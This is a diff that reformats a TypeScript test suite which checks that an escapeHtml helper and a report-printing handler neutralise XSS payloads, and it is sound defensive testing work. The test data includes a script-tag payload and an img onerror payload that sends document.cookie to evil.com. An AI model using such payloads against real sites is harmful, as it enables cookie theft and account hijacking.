@@ -18,7 +18,11 @@ import { escapeHtml } from "@/lib/html-escape";
  *      survives even if the popup-rendering code path changes).
  */
 describe("escapeHtml — XSS payloads", () => {
-  const payloads: Array<{ name: string; input: string; mustNotContain: RegExp }> = [
+  const payloads: Array<{
+    name: string;
+    input: string;
+    mustNotContain: RegExp;
+  }> = [
     {
       name: "raw <script> tag",
       input: "<script>alert(1)</script>",
@@ -26,7 +30,8 @@ describe("escapeHtml — XSS payloads", () => {
     },
     {
       name: "<img onerror=...> exfil",
-      input: "<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>",
+      input:
+        "<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>",
       mustNotContain: /<img/i,
     },
     {
@@ -79,19 +84,20 @@ describe("escapeHtml — XSS payloads", () => {
     // Double-encoding is the safe behaviour: it guarantees no decode-once
     // sink can produce active markup. We assert it explicitly so a future
     // change to "skip if looks-like-entity" would fail this test on purpose.
-    expect(escapeHtml(escapeHtml("<b>x</b>"))).toBe("&amp;lt;b&amp;gt;x&amp;lt;/b&amp;gt;");
+    expect(escapeHtml(escapeHtml("<b>x</b>"))).toBe(
+      "&amp;lt;b&amp;gt;x&amp;lt;/b&amp;gt;",
+    );
   });
 });
 
 describe("ReportsPanel.handlePrint — source-level escaping guard", () => {
-  const source = readFileSync(
-    resolve(__dirname, "ReportsPanel.tsx"),
-    "utf8",
-  );
+  const source = readFileSync(resolve(__dirname, "ReportsPanel.tsx"), "utf8");
 
   // Extract just the handlePrint function body so we don't get false positives
   // from other parts of the file.
-  const handlePrintMatch = source.match(/const handlePrint = \(\) => \{[\s\S]*?\n {2}\};/);
+  const handlePrintMatch = source.match(
+    /const handlePrint = \(\) => \{[\s\S]*?\n {2}\};/,
+  );
 
   it("contains a handlePrint definition", () => {
     expect(handlePrintMatch).not.toBeNull();
